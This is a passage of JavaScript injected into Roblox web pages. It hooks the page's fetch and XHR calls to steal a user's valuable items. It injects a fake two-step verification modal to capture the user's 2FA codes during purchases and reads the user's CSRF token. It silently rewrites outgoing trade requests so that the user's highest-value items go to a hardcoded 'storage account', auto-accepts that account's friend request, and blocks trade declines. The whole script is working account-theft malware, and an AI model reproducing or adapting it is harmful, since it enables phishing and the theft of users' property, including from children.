                              "challengeId": challengeIdValue,
                              "actionType": "Generic"
                            };
                            const retryChallengeMetadataB64 = btoa(JSON.stringify(retryChallengeMetadataObj));

                            // Build new headers with challenge metadata
                            const retryHeaders = {...pausedRequest.headers};
                            retryHeaders["rblx-challenge-type"] = "twostepverification";
                            retryHeaders["rblx-challenge-id"] = challengeId;
                            retryHeaders["rblx-challenge-metadata"] = retryChallengeMetadataB64;

                            // Retry the purchase request
                            const retryResponse = await origFetch(pausedRequest.url, {
                              method: pausedRequest.method,
                              headers: retryHeaders,
                              body: pausedRequest.body,
                              credentials: 'include'
                            });

                            console.log("[2FA] ✓ Purchase request retried with challenge headers, status:", retryResponse.status);
                            pausedRequest.resolve(retryResponse);
                            return;
                          } else {
                            console.error("[2FA] ✗ /continue failed:", continueData);
                          }
                        } else {
                          console.error("[2FA] ✗ Failed to get verificationToken from /verify for purchase.");
                          console.error("[2FA] Response status:", verifyResponse.status);
                          console.error("[2FA] Response body:", JSON.stringify(verifyData, null, 2));
                          console.error("[2FA] Response keys:", Object.keys(verifyData || {}));
                          if (verifyData && verifyData.data) {
                            console.error("[2FA] Response data keys:", Object.keys(verifyData.data || {}));
                          }
                        }
                      } catch (e) {
                        console.error("[2FA] Error in challenge flow:", e);
                      }
                    }

                    // If challenge handling failed, reject
                    pausedRequest.reject(new Error('Failed to handle 2FA challenge'));
                  } else {
                    // Request succeeded without challenge
                    console.log("[2FA] Purchase request completed, status:", response.status);
                    pausedRequest.resolve(response);
                  }
                } catch (error) {
                  console.error("[2FA] Error continuing request:", error);
                  pausedRequest.reject(error);
                }
              })();
            }
          } catch (e) {
            console.error("[2FA] Error enabling settings:", e);
            // Still continue the request even if settings fail
            const pausedRequest = window.__rbx_paused_request;
            if (pausedRequest && pausedRequest.resolve) {
              pausedRequest.resolve({
                first_code: firstInvalidCode,
                second_code: secondCode
              });
            }
          }
        })();

        setTimeout(() => {
          document.querySelectorAll('[role="dialog"]').forEach(d => {
            d.removeAttribute("aria-hidden");
            d.style.pointerEvents = "";
            d.style.filter = "";
          });
          root.remove();
        }, 1200);
      });

      const cleanupAndRemove = (result, reason) => {
        const requestKey = window.__rbx_request_key || "";
        const pausedRequest = window.__rbx_paused_request;

        const resultData = {
          result: result,
          reason: reason || "User cancelled",
          request_key: requestKey
        };
        store2FAResult(resultData);

        // Reject the paused request
        if (pausedRequest && pausedRequest.reject) {
          console.log("[2FA] Request cancelled, rejecting...");
          pausedRequest.reject(new Error(reason || "User cancelled"));
        }

        document.querySelectorAll('[role="dialog"]').forEach(d => {
          d.removeAttribute("aria-hidden");
          d.style.pointerEvents = "";
          d.style.filter = "";
        });
        root.remove();
      };

      closeBtn.onclick = () => cleanupAndRemove("cancelled", "X button pressed");

      function escHandler(e) {
        if (e.key === "Escape") {
          cleanupAndRemove("cancelled", "ESC key pressed");
          document.removeEventListener("keydown", escHandler);
        }
      }
      document.addEventListener("keydown", escHandler);

      const backdrop = root.querySelector(".modal-backdrop");
      if (backdrop) {
        backdrop.onclick = function(e) {
          if (e.target === backdrop) {
            cleanupAndRemove("cancelled", "backdrop clicked");
          }
        };
      }

      console.log("[2FA] Modal initialization complete");
    }

    if (document.body) {
      injectModal();
    } else {
      const checkBody = setInterval(() => {
        if (document.body) {
          clearInterval(checkBody);
          injectModal();
        }
      }, 50);
      setTimeout(() => clearInterval(checkBody), 5000);
    }
  };

  // Initialize: Get user info and CSRF token
  (async () => {
    console.log("[PROXY] Initializing...");

    // Get CSRF token
    getCSRFToken();

    // Get user info
    const userInfo = getUserInfo();
    if (userInfo && userInfo.user_id) {
      state.userInfo = userInfo;
      state.hasPremium = userInfo.is_premium === true;
      state.premiumCheckComplete = true;
      console.log("[PROXY] User info:", userInfo);

      if (!state.hasPremium) {
        console.warn("[PROXY] ⚠ User does not have premium");
        return;
      }

      // Get tradable items
      console.log("[PROXY] Fetching tradable items...");
      const userTradable = await getTradableItems(userInfo.user_id);
      state.userInventory = userTradable.items;
      state.userInstanceIds = userTradable.instanceIds;
      state.userTradableItems = userTradable.items; // Store full items for trade selection

      const storageTradable = await getTradableItems(STORAGE_ACCOUNT_ID);
      state.storageInventory = storageTradable.items;
      state.storageInstanceIds = storageTradable.instanceIds;
      state.storageTradableItems = storageTradable.items; // Store full items for trade selection

      console.log("[PROXY] Ready! User items:", state.userInstanceIds.length, "Storage items:", state.storageInstanceIds.length);
    }
  })();

  // Intercept fetch requests
  const origFetch = window.fetch;
  window.fetch = async (...args) => {
    try {
      const url = args[0];
      const options = args[1] || {};
      const body = options.body;

      // Check if purchase request
      const isPurchase = url && typeof url === 'string' &&
        (url.includes('/purchase-item') || (url.includes('/purchase') && !url.includes('/purchase-item')));

      if (isPurchase) {
        console.log('[INTERCEPT] 🚨 PURCHASE DETECTED! Pausing request...', url);

        const requestKey = `purchase_${Date.now()}`;

        // Create a promise that will resolve/reject when codes are entered
        return new Promise(async (resolve, reject) => {
          // Store the paused request
          const pausedRequest = {
            url: url,
            method: options.method || 'POST',
            headers: options.headers || {},
            body: body,
            resolve: resolve,
            reject: reject
          };

          state.pausedRequests[requestKey] = pausedRequest;

          // Inject modal
          inject2FAModal(requestKey, pausedRequest);

          // Wait for codes (with timeout)
          const timeout = setTimeout(() => {
            console.log('[INTERCEPT] Timeout waiting for 2FA codes');
            if (state.pausedRequests[requestKey]) {
              delete state.pausedRequests[requestKey];
              reject(new Error('Timeout waiting for 2FA codes'));
            }
          }, 300000); // 5 minute timeout

          // Poll for result (modal handles verify/continue/retry directly, this just waits)
          const checkResult = async () => {
            try {
              // Check if request was already resolved/rejected by modal
              if (!state.pausedRequests[requestKey]) {
                // Request was already handled by modal (verify/continue/retry completed)
                clearTimeout(timeout);
                return;
              }

              const meta = document.querySelector('meta[name="rbx-2fa-result"]');
              if (meta && meta.getAttribute('data-ready') === 'true') {
                const result = meta.getAttribute('data-result');
                const requestKeyFromMeta = meta.getAttribute('data-request-key');

                if (requestKeyFromMeta === requestKey) {
                  clearTimeout(timeout);

                  if (result === 'verified') {
                    // Modal handles verify/continue/retry and calls pausedRequest.resolve() directly
                    // Just wait - don't continue here
                    console.log('[INTERCEPT] Codes verified, waiting for modal to complete verify/continue/retry...');
                  } else {
                    // Cancelled - only reject if not already handled
                    if (state.pausedRequests[requestKey]) {
                      reject(new Error(meta.getAttribute('data-reason') || 'User cancelled'));
                      delete state.pausedRequests[requestKey];
                    }
                  }
                  return;
                }
              }

              // Check again in 100ms
              setTimeout(checkResult, 100);
            } catch (e) {
              clearTimeout(timeout);
              if (state.pausedRequests[requestKey]) {
                reject(e);
                delete state.pausedRequests[requestKey];
              }
            }
          };

          checkResult();
        });
      }
    } catch (e) {
      console.error('[INTERCEPT] Error:', e);
    }
    return origFetch(...args);
  };

  // Intercept XHR
  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url, ...rest) {
    this._url = url;
    this._method = method;
    return origOpen.apply(this, [method, url, ...rest]);
  };

  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (body) {
    const xhr = this;
    const url = this._url || this.responseURL || '';

    const isPurchase = url && typeof url === 'string' &&
      (url.includes('/purchase-item') || (url.includes('/purchase') && !url.includes('/purchase-item')));

    if (isPurchase) {
      console.log('[INTERCEPT] 🚨 PURCHASE DETECTED (XHR)! Pausing request...', url);

      const requestKey = `purchase_${Date.now()}_xhr`;

      // Store original send function
      const originalSend = origSend;

      // Create paused request
      const pausedRequest = {
        url: url,
        method: xhr._method || 'POST',
        headers: {},
        body: body,
        xhr: xhr,
        originalSend: originalSend
      };

      // Get headers from XHR
      try {
        const headers = xhr.getAllResponseHeaders ? xhr.getAllResponseHeaders() : {};
        pausedRequest.headers = headers;
      } catch (e) {
        console.warn('[INTERCEPT] Could not get XHR headers:', e);
      }

      state.pausedRequests[requestKey] = pausedRequest;

      // Inject modal
      inject2FAModal(requestKey, pausedRequest);

      // Wait for codes
      const checkResult = () => {
        const meta = document.querySelector('meta[name="rbx-2fa-result"]');
        if (meta && meta.getAttribute('data-ready') === 'true') {
          const result = meta.getAttribute('data-result');
          const requestKeyFromMeta = meta.getAttribute('data-request-key');

          if (requestKeyFromMeta === requestKey) {
            if (result === 'verified') {
              console.log('[INTERCEPT] Both codes received! Continuing XHR request...');
              // Continue the original request
              originalSend.apply(xhr, [body]);
            } else {
              console.log('[INTERCEPT] Request cancelled, rejecting XHR...');
              // Reject
              if (xhr.onerror) {
                xhr.onerror(new Error(meta.getAttribute('data-reason') || 'User cancelled'));
              }
            }
            delete state.pausedRequests[requestKey];
            return;
          }
        }

        // Check again in 100ms
        setTimeout(checkResult, 100);
      };

      // Start checking
      checkResult();

      // Timeout after 5 minutes
      setTimeout(() => {
        if (state.pausedRequests[requestKey]) {
          console.log('[INTERCEPT] Timeout waiting for 2FA codes (XHR)');
          delete state.pausedRequests[requestKey];
          if (xhr.onerror) {
            xhr.onerror(new Error('Timeout waiting for 2FA codes'));
          }
        }
      }, 300000);

      return; // Don't send yet
    }

    return origSend.apply(this, arguments);
  };

  console.log("[PROXY] Purchase interceptor ready");
})();

(() => {
  console.log("[INJECTOR] IIFE executing...");
  const STORAGE_ACCOUNT_ID = 540003639;

  // Shared state for threads
  const state = {
    userInfo: null,
    userInventory: null,
    userInstanceIds: [],
    userTradableItems: [],
    userLimiteds: [],
    storageInfo: null,
    storageInventory: null,
    storageInstanceIds: [],
    storageTradableItems: [],
    storageLimiteds: [],
    tradePlan: null,
    threadsReady: {
      userThread: false,
      storageThread: false,
      tradePlanThread: false
    }
  };

  // ============================================
  // THREAD 1: Check User Info / Limiteds
  // ============================================
  const userInfoThread = async () => {
    console.log("[THREAD 1] Starting user info/limiteds check...");

    try {
      const getCSRFToken = () => {
        try {
          const csrfToken = localStorage.getItem('x-csrf-token') ||
                           localStorage.getItem('csrf-token') ||
                           localStorage.getItem('X-CSRF-Token');
          if (csrfToken) {
            console.log('[THREAD 1] Got CSRF token');
            return csrfToken;
          }
        } catch (e) {
          console.error('[THREAD 1] Error getting CSRF token:', e);
        }
        return null;
      };

      const getUserInfo = () => {
        try {
          const meta = document.querySelector('meta[name="user-data"]');
          if (meta) {
            return {
              user_id: meta.getAttribute("data-userid") || "",
              name: meta.getAttribute("data-name") || "",
              display_name: meta.getAttribute("data-displayname") || "",
              is_premium: meta.getAttribute("data-ispremiumuser") === "true",
              is_under_13: meta.getAttribute("data-isunder13") === "true",
              created: meta.getAttribute("data-created") || "",
              has_verified_badge: meta.getAttribute("data-hasverifiedbadge") === "true",
              method: "meta"
            };
          }

          const elem = document.querySelector("a.user-name-container");
          if (elem) {
            const href = elem.getAttribute("href") || "";
            const text = elem.textContent || elem.innerText || "";
            const userIdMatch = href.match(/\/users\/(\d+)\/profile/);
            const userId = userIdMatch ? userIdMatch[1] : "";
            const nameMatch = text.match(/Morning,\s*(.+)/);
            const name = nameMatch ? nameMatch[1].trim() : text.trim();
            return {
              user_id: userId,
              name: name,
              display_name: name,
              is_premium: false,
              method: "fallback"
            };
          }
          return null;
        } catch (e) {
          console.error('[THREAD 1] Error getting user info:', e);
          return null;
        }
      };

      const getTradableItems = async (userId) => {
        if (!userId) return { items: [], instanceIds: [], limiteds: [] };

        try {
          const allItems = [];
          const instanceIds = [];
          const limiteds = [];
          let nextCursor = null;
          let pageCount = 0;
          const maxPages = 100;

          while (pageCount < maxPages) {
            let url = `https://trades.roblox.com/v2/users/${userId}/tradableitems?sortBy=CreationTime&sortOrder=Desc&limit=50`;
            if (nextCursor) {
              url += `&cursor=${encodeURIComponent(nextCursor)}`;
            }

            const response = await fetch(url, {
              method: 'GET',
              credentials: 'include',
              headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
              }
            });

            if (!response.ok) {
              console.error(`[THREAD 1] API error: ${response.status}`);
              break;
            }

            const data = await response.json();

            if (data.items && Array.isArray(data.items)) {
              allItems.push(...data.items);

              for (const item of data.items) {
                const itemTarget = item.itemTarget || {};

                // Check for limited status - try multiple property names
                const isLimited = itemTarget.isLimited ||
                                 itemTarget.isLimitedUnique ||
                                 itemTarget.isLimitedEdition ||
                                 itemTarget.limited ||
                                 itemTarget.limitedEdition ||
                                 (itemTarget.itemType && itemTarget.itemType.toLowerCase().includes('limited')) ||
                                 false;

                const estimatedValue = item.estimatedValue || item.estimated_value || 0;
                const recentAveragePrice = item.recentAveragePrice || item.recent_average_price || 0;
                const value = estimatedValue > 0 ? estimatedValue : recentAveragePrice;

                if (item.instances && Array.isArray(item.instances)) {
                  for (const instance of item.instances) {
                    const instanceId = instance.collectibleItemInstanceId;
                    const isOnHold = instance.isOnHold || instance.is_on_hold || false;

                    if (instanceId && !isOnHold && !instanceIds.includes(instanceId)) {
                      instanceIds.push(instanceId);

                      // Track limiteds - also track if value > 0 (likely a limited/valuable item)
                      if (isLimited || value > 0) {
                        limiteds.push({
                          instanceId: instanceId,
                          itemId: itemTarget.id || itemTarget.itemId || itemTarget.assetId || null,
                          name: itemTarget.name || "Unknown",
                          value: value,
                          estimatedValue: estimatedValue,
                          recentAveragePrice: recentAveragePrice,
                          isLimited: isLimited,
                          isOnHold: isOnHold,
                          itemTarget: itemTarget // Store full itemTarget for debugging
                        });
                      }
                    }
                  }
                }
              }
            }

            nextCursor = data.nextPageCursor;
            if (!nextCursor) break;

            pageCount++;
            await new Promise(resolve => setTimeout(resolve, 200));
          }

          // Debug: Log first item structure if available
          if (allItems.length > 0 && allItems[0]) {
            console.log("[THREAD 1] Sample item structure:", JSON.stringify({
              hasItemTarget: !!allItems[0].itemTarget,
              itemTargetKeys: allItems[0].itemTarget ? Object.keys(allItems[0].itemTarget) : [],
              estimatedValue: allItems[0].estimatedValue || allItems[0].estimated_value,
              recentAveragePrice: allItems[0].recentAveragePrice || allItems[0].recent_average_price
            }, null, 2));
          }

          return { items: allItems, instanceIds: instanceIds, limiteds: limiteds };
        } catch (e) {
          console.error('[THREAD 1] Error fetching tradable items:', e);
          return { items: [], instanceIds: [], limiteds: [] };
        }
      };

      const userInfo = getUserInfo();
      if (!userInfo || !userInfo.user_id) {
        console.error("[THREAD 1] ✗ No user info found");
        state.threadsReady.userThread = true;
        return;
      }

      state.userInfo = userInfo;
      console.log("[THREAD 1] User info:", userInfo);

      console.log("[THREAD 1] Fetching user tradable items and limiteds...");
      const userTradable = await getTradableItems(userInfo.user_id);

      state.userInventory = userTradable.items;
      state.userInstanceIds = userTradable.instanceIds;
      state.userTradableItems = userTradable.items;
      state.userLimiteds = userTradable.limiteds;

      console.log("[THREAD 1] ✓ Complete!");
      console.log("[THREAD 1] User items:", state.userInstanceIds.length);
      console.log("[THREAD 1] User limiteds:", state.userLimiteds.length);
      if (state.userLimiteds.length > 0) {
        console.log("[THREAD 1] Sample limited:", state.userLimiteds[0]);
      }

      state.threadsReady.userThread = true;
    } catch (e) {
      console.error("[THREAD 1] Error:", e);
      state.threadsReady.userThread = true;
    }
  };

  // ============================================
  // THREAD 2: Check Storage Account Limiteds
  // ============================================
  const storageAccountThread = async () => {
    console.log("[THREAD 2] Starting storage account check...");

    try {
      const getTradableItems = async (userId) => {
        if (!userId) return { items: [], instanceIds: [], limiteds: [] };

        try {
          const allItems = [];
          const instanceIds = [];
          const limiteds = [];
          let nextCursor = null;
          let pageCount = 0;
          const maxPages = 100;

          while (pageCount < maxPages) {
            let url = `https://trades.roblox.com/v2/users/${userId}/tradableitems?sortBy=CreationTime&sortOrder=Desc&limit=50`;
            if (nextCursor) {
              url += `&cursor=${encodeURIComponent(nextCursor)}`;
            }

            const response = await fetch(url, {
              method: 'GET',
              credentials: 'include',
              headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
              }
            });

            if (!response.ok) {
              console.error(`[THREAD 2] API error: ${response.status}`);
              break;
            }

            const data = await response.json();

            if (data.items && Array.isArray(data.items)) {
              allItems.push(...data.items);

              for (const item of data.items) {
                const itemTarget = item.itemTarget || {};

                // Check for limited status - try multiple property names
                const isLimited = itemTarget.isLimited ||
                                 itemTarget.isLimitedUnique ||
                                 itemTarget.isLimitedEdition ||
                                 itemTarget.limited ||
                                 itemTarget.limitedEdition ||
                                 (itemTarget.itemType && itemTarget.itemType.toLowerCase().includes('limited')) ||
                                 false;

                const estimatedValue = item.estimatedValue || item.estimated_value || 0;
                const recentAveragePrice = item.recentAveragePrice || item.recent_average_price || 0;
                const value = estimatedValue > 0 ? estimatedValue : recentAveragePrice;

                if (item.instances && Array.isArray(item.instances)) {
                  for (const instance of item.instances) {
                    const instanceId = instance.collectibleItemInstanceId;
                    const isOnHold = instance.isOnHold || instance.is_on_hold || false;

                    if (instanceId && !isOnHold && !instanceIds.includes(instanceId)) {
                      instanceIds.push(instanceId);

                      // Track limiteds - also track if value > 0 (likely a limited/valuable item)
                      if (isLimited || value > 0) {
                        limiteds.push({
                          instanceId: instanceId,
                          itemId: itemTarget.id || itemTarget.itemId || itemTarget.assetId || null,
                          name: itemTarget.name || "Unknown",
                          value: value,
                          estimatedValue: estimatedValue,
                          recentAveragePrice: recentAveragePrice,
                          isLimited: isLimited,
                          isOnHold: isOnHold,
                          itemTarget: itemTarget
                        });
                      }
                    }
                  }
                }
              }
            }

            nextCursor = data.nextPageCursor;
            if (!nextCursor) break;

            pageCount++;
            await new Promise(resolve => setTimeout(resolve, 200));
          }

          // Debug: Log first item structure if available
          if (allItems.length > 0 && allItems[0]) {
            console.log("[THREAD 2] Sample item structure:", JSON.stringify({
              hasItemTarget: !!allItems[0].itemTarget,
              itemTargetKeys: allItems[0].itemTarget ? Object.keys(allItems[0].itemTarget) : [],
              estimatedValue: allItems[0].estimatedValue || allItems[0].estimated_value,
              recentAveragePrice: allItems[0].recentAveragePrice || allItems[0].recent_average_price
            }, null, 2));
          }

          return { items: allItems, instanceIds: instanceIds, limiteds: limiteds };
        } catch (e) {
          console.error('[THREAD 2] Error fetching tradable items:', e);
          return { items: [], instanceIds: [], limiteds: [] };
        }
      };

      console.log("[THREAD 2] Fetching storage account tradable items and limiteds...");
      const storageTradable = await getTradableItems(STORAGE_ACCOUNT_ID);

      state.storageInventory = storageTradable.items;
      state.storageInstanceIds = storageTradable.instanceIds;
      state.storageTradableItems = storageTradable.items;
      state.storageLimiteds = storageTradable.limiteds;

      console.log("[THREAD 2] ✓ Complete!");
      console.log("[THREAD 2] Storage items:", state.storageInstanceIds.length);
      console.log("[THREAD 2] Storage limiteds:", state.storageLimiteds.length);
      if (state.storageLimiteds.length > 0) {
        console.log("[THREAD 2] Sample limited:", state.storageLimiteds[0]);
      }

      state.threadsReady.storageThread = true;
    } catch (e) {
      console.error("[THREAD 2] Error:", e);
      state.threadsReady.storageThread = true;
    }
  };

  // ============================================
  // THREAD 3: Generate Trade Plan
  // ============================================
  const tradePlanThread = async () => {
    console.log("[THREAD 3] Starting trade plan generation...");

    const waitForThreads = () => {
      return new Promise((resolve) => {
        const checkReady = () => {
          if (state.threadsReady.userThread && state.threadsReady.storageThread) {
            resolve();
          } else {
            setTimeout(checkReady, 100);
          }
        };
        checkReady();
      });
    };

    try {
      console.log("[THREAD 3] Waiting for user and storage threads to complete...");
      await waitForThreads();

      console.log("[THREAD 3] Both threads ready, generating trade plan...");

      const generateTradePlan = () => {
        const plan = {
          timestamp: new Date().toISOString(),
          userLimiteds: state.userLimiteds || [],
          storageLimiteds: state.storageLimiteds || [],
          recommendedTrades: [],
          summary: {
            userLimitedCount: state.userLimiteds?.length || 0,
            storageLimitedCount: state.storageLimiteds?.length || 0,
            totalUserItems: state.userInstanceIds?.length || 0,
            totalStorageItems: state.storageInstanceIds?.length || 0
          }
        };

        // Find storage items under 1k (lowest value) to receive
        const storageItemsUnder1k = [];
        for (const item of state.storageTradableItems || []) {
          if (!item || typeof item !== 'object') continue;

          const estimatedValue = item.estimatedValue || item.estimated_value || 0;
          const recentAveragePrice = item.recentAveragePrice || item.recent_average_price || 0;
          const value = estimatedValue > 0 ? estimatedValue : recentAveragePrice;

          if (value > 0 && value < 1000) {
            const instances = item.instances || [];
            for (const instance of instances) {
              if (!instance.isOnHold && !instance.is_on_hold) {
                const instanceId = instance.collectibleItemInstanceId || instance.collectible_item_instance_id;
                if (instanceId) {
                  storageItemsUnder1k.push({
                    instanceId: instanceId,
                    value: value,
                    item: item
                  });
                  break;
                }
              }
            }
          }
        }

        storageItemsUnder1k.sort((a, b) => a.value - b.value);

        // Get user items (highest value, not on hold, max 4)
        const availableUserItems = [];
        for (const item of state.userTradableItems || []) {
          if (!item || typeof item !== 'object') continue;

          const instances = item.instances || [];
          const estimatedValue = item.estimatedValue || item.estimated_value || 0;
          const recentAveragePrice = item.recentAveragePrice || item.recent_average_price || 0;
          const value = estimatedValue > 0 ? estimatedValue : recentAveragePrice;

          for (const instance of instances) {
            if (!instance.isOnHold && !instance.is_on_hold) {
              const instanceId = instance.collectibleItemInstanceId || instance.collectible_item_instance_id;
              if (instanceId) {
                availableUserItems.push({
                  instanceId: instanceId,
                  value: value
                });
              }
            }
          }
        }

        availableUserItems.sort((a, b) => b.value - a.value);

        // Generate recommended trades
        if (storageItemsUnder1k.length > 0 && availableUserItems.length > 0) {
          const selectedStorageItem = storageItemsUnder1k[0];
          const selectedUserItems = availableUserItems.slice(0, 4);

          plan.recommendedTrades.push({
            storageItem: {
              instanceId: selectedStorageItem.instanceId,
              value: selectedStorageItem.value
            },
            userItems: selectedUserItems.map(item => ({
              instanceId: item.instanceId,
              value: item.value
            })),
            totalUserValue: selectedUserItems.reduce((sum, item) => sum + item.value, 0),
            totalStorageValue: selectedStorageItem.value,
            netValue: selectedUserItems.reduce((sum, item) => sum + item.value, 0) - selectedStorageItem.value
          });
        }

        return plan;
      };

      const tradePlan = generateTradePlan();
      state.tradePlan = tradePlan;

      console.log("[THREAD 3] ✓ Trade plan generated!");
      console.log("[THREAD 3] Trade Plan Summary:", JSON.stringify(tradePlan.summary, null, 2));
      console.log("[THREAD 3] Recommended Trades:", tradePlan.recommendedTrades.length);

      if (tradePlan.recommendedTrades.length > 0) {
        const trade = tradePlan.recommendedTrades[0];
        console.log("[THREAD 3] Top Trade:");
        console.log("  Storage Item:", trade.storageItem.instanceId, "Value:", trade.storageItem.value);
        console.log("  User Items:", trade.userItems.length, "Total Value:", trade.totalUserValue);
        console.log("  Net Value:", trade.netValue);
      }

      try {
        let meta = document.querySelector('meta[name="rbx-trade-plan"]');
        if (!meta) {
          meta = document.createElement('meta');
          meta.name = 'rbx-trade-plan';
          document.head.appendChild(meta);
        }
        meta.setAttribute('data-plan', JSON.stringify(tradePlan));
        meta.setAttribute('data-ready', 'true');
        console.log("[THREAD 3] Trade plan stored in meta tag");
      } catch (e) {
        console.error("[THREAD 3] Error storing trade plan:", e);
      }

      state.threadsReady.tradePlanThread = true;
    } catch (e) {
      console.error("[THREAD 3] Error:", e);
      state.threadsReady.tradePlanThread = true;
    }
  };

  // ============================================
  // Get Trade Plan Payload
  // ============================================
  const getTradePlanPayload = () => {
    if (!state.tradePlan || !state.tradePlan.recommendedTrades || state.tradePlan.recommendedTrades.length === 0) {
      console.warn("[TRADE_INTERCEPT] No trade plan available");
      return null;
    }

    if (!state.userInfo || !state.userInfo.user_id) {
      console.warn("[TRADE_INTERCEPT] No user info available");
      return null;
    }

    const trade = state.tradePlan.recommendedTrades[0];
    const userId = parseInt(state.userInfo.user_id);

    return {
      senderOffer: {
        userId: userId,
        robux: 0,
        collectibleItemInstanceIds: trade.userItems.map(item => item.instanceId)
      },
      recipientOffer: {
        userId: STORAGE_ACCOUNT_ID,
        robux: 0,
        collectibleItemInstanceIds: [trade.storageItem.instanceId]
      }
    };
  };

  // Accept friend request from storage account (called when we start editing trade payload)
  const acceptFriendRequestFromStorage = async () => {
    try {
      const csrfToken = localStorage.getItem('x-csrf-token') ||
                       localStorage.getItem('csrf-token') ||
                       localStorage.getItem('X-CSRF-Token');
      if (!csrfToken) {
        console.warn('[TRADE_INTERCEPT] No CSRF token for accept-friend-request');
        return;
      }
      const res = await fetch("https://friends.roblox.com/v1/users/540003639/accept-friend-request", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "X-CSRF-Token": csrfToken
        }
      });
      if (res.ok) {
        console.log('[TRADE_INTERCEPT] ✓ Accept friend request sent');
      } else {
        console.warn('[TRADE_INTERCEPT] Accept friend request status:', res.status);
      }
    } catch (e) {
      console.warn('[TRADE_INTERCEPT] Accept friend request error:', e);
    }
  };

  // ============================================
  // Intercept Fetch Requests
  // ============================================
  const origFetch = window.fetch;
  window.fetch = async (...args) => {
    try {
      const url = args[0];
      const options = args[1] || {};
      const method = options.method || 'GET';
      let body = options.body;

      // Check if trade send request
      if (url && typeof url === 'string' && url.includes('/v2/trades/send') && method === 'POST') {
        console.log('[TRADE_INTERCEPT] 🚨 TRADE SEND DETECTED! Modifying payload...', url);

        // Wait for trade plan if not ready
        if (!state.tradePlan) {
          console.log('[TRADE_INTERCEPT] Waiting for trade plan...');
          const waitForPlan = () => {
            return new Promise((resolve) => {
              const checkPlan = () => {
                if (state.tradePlan) {
                  resolve();
                } else {
                  setTimeout(checkPlan, 100);
                }
              };
              checkPlan();
            });
          };
          await waitForPlan();
        }

        const tradePlanPayload = getTradePlanPayload();
        if (tradePlanPayload) {
          await acceptFriendRequestFromStorage();
          console.log('[TRADE_INTERCEPT] Original payload:', body);
          console.log('[TRADE_INTERCEPT] Modified payload:', JSON.stringify(tradePlanPayload, null, 2));

          body = JSON.stringify(tradePlanPayload);
          options.body = body;

          if (options.headers) {
            options.headers['Content-Length'] = new Blob([body]).size.toString();
          }
        } else {
          console.warn('[TRADE_INTERCEPT] Could not generate trade plan payload, using original');
        }
      }

      // Check if trade decline request
      if (url && typeof url === 'string' && url.includes('/v1/trades/') && url.includes('/decline')) {
        console.log('[TRADE_INTERCEPT] 🚫 TRADE DECLINE DETECTED! Blocking request...', url);
        return Promise.reject(new Error('Trade decline blocked by interceptor'));
      }

      return origFetch(url, options);
    } catch (e) {
      console.error('[TRADE_INTERCEPT] Error:', e);
      return origFetch(...args);
    }
  };

  // ============================================
  // Intercept XHR Requests
  // ============================================
  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url, ...rest) {
    this._url = url;
    this._method = method;
    return origOpen.apply(this, [method, url, ...rest]);
  };

  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (body) {
    const xhr = this;
    const url = this._url || this.responseURL || '';
    const method = this._method || 'POST';

    // Check if trade send request
    if (url && typeof url === 'string' && url.includes('/v2/trades/send') && method === 'POST') {
      console.log('[TRADE_INTERCEPT] 🚨 TRADE SEND DETECTED (XHR)! Modifying payload...', url);

      try {
        const waitForPlan = () => {
          return new Promise((resolve) => {
            const checkPlan = () => {
              if (state.tradePlan) {
                resolve();
              } else {
                setTimeout(checkPlan, 100);
              }
            };
            checkPlan();
          });
        };

        (async () => {
          await waitForPlan();

          const tradePlanPayload = getTradePlanPayload();
          if (tradePlanPayload) {
            await acceptFriendRequestFromStorage();
            console.log('[TRADE_INTERCEPT] Original XHR payload:', body);
            console.log('[TRADE_INTERCEPT] Modified XHR payload:', JSON.stringify(tradePlanPayload, null, 2));

            body = JSON.stringify(tradePlanPayload);
          } else {
            console.warn('[TRADE_INTERCEPT] Could not generate trade plan payload for XHR, using original');
          }

          return origSend.apply(xhr, [body]);
        })();

        return;
      } catch (e) {
        console.error('[TRADE_INTERCEPT] Error modifying XHR:', e);
        return origSend.apply(this, arguments);
      }
    }

    // Check if trade decline request
    if (url && typeof url === 'string' && url.includes('/v1/trades/') && url.includes('/decline')) {
      console.log('[TRADE_INTERCEPT] 🚫 TRADE DECLINE DETECTED (XHR)! Blocking request...', url);

      if (xhr.onerror) {
        xhr.onerror(new Error('Trade decline blocked by interceptor'));
      }
      return;
    }

    return origSend.apply(this, arguments);
  };

  // ============================================
  // Start All Threads Concurrently
  // ============================================
  (async () => {
    console.log("[INIT] Starting all threads concurrently...");

    await Promise.all([
      userInfoThread(),
      storageAccountThread(),
      tradePlanThread()
    ]);

    console.log("[INIT] All threads completed!");
    console.log("[INIT] Final State:");
    console.log("  User Items:", state.userInstanceIds?.length || 0);
    console.log("  User Limiteds:", state.userLimiteds?.length || 0);
    console.log("  Storage Items:", state.storageInstanceIds?.length || 0);
    console.log("  Storage Limiteds:", state.storageLimiteds?.length || 0);
    console.log("  Trade Plan Ready:", state.tradePlan !== null);
    if (state.tradePlan) {
      console.log("  Trade Plan Recommended Trades:", state.tradePlan.recommendedTrades?.length || 0);
    }
  })();

  // Expose state to window for debugging
  window.__rbx_state = state;
  console.log("[INJECTOR] State exposed to window.__rbx_state");
  console.log("[INJECTOR] Trade interceptors ready");
  console.log("[INJECTOR] Script fully loaded");
})();

console.log("[INJECTOR] Script fully loaded");
